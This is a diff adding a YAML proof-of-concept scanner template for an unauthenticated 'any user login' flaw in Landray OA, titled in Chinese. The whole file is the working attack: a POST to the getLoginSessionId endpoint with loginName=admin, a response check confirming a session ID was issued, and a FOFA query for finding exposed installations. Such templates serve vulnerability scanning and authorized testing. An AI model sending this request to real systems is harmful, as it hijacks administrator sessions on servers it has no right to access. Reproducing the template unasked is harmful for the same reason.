@@ -1,0 +1,27 @@
+id: poc-yaml-lan-ling-oa-getLoginSessionId-anyuser-login
+info:
+  name: 蓝凌OA getLoginSessionId 任意用户登录漏洞
+  severity: high
+  tags:
+  - 两高一弱
+  - 未授权访问
+  finger: 蓝凌oa
+  fofa: app="Landray-OA系统"
+requests:
+- method: POST
+  path: /api/sys-authentication/loginService/getLoginSessionId
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+    Accept: '*/*'
+  data: loginName=admin
+  expression: 'status_code == 200 &&
+
+    contains(body,"errorMsg") &&
+
+    contains(body,"sessionId") &&
+
+    contains(body,"\"result\":true")
+
+    '
+variables: {}
+transport: http
